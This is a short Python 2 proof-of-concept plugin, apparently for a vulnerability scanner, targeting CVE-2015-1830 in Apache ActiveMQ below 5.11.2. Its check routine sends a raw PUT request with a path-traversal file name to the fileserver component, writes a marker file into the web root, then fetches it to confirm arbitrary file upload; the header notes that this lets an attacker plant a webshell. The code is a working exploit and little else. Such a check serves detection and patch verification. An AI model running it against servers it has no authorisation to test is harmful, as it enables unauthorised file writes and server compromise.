#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: ActiveMQ unauthenticated RCE
    info: CVE-2015-1830，攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。
    影响版本： Apache Group ActiveMQ < 5.11.2
    level: 紧急
    type: 任意文件上传
    repair: 升级ActiveMQ，或禁用fileserver组件
'''

import socket,urllib2,time
from POC_Framework import POC

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        try:
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            filename = self.random_str(6)
            flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n"%(filename)
            s.send(flag)
            time.sleep(1)
            s.recv(1024)
            s.close()
            url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt'%(filename)
            res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
            if 'xxscan0' in res_html:
                return True
        except:
            return False

if __name__ == "__main__":

    Check_POC = myPOC()
    Check_POC.run()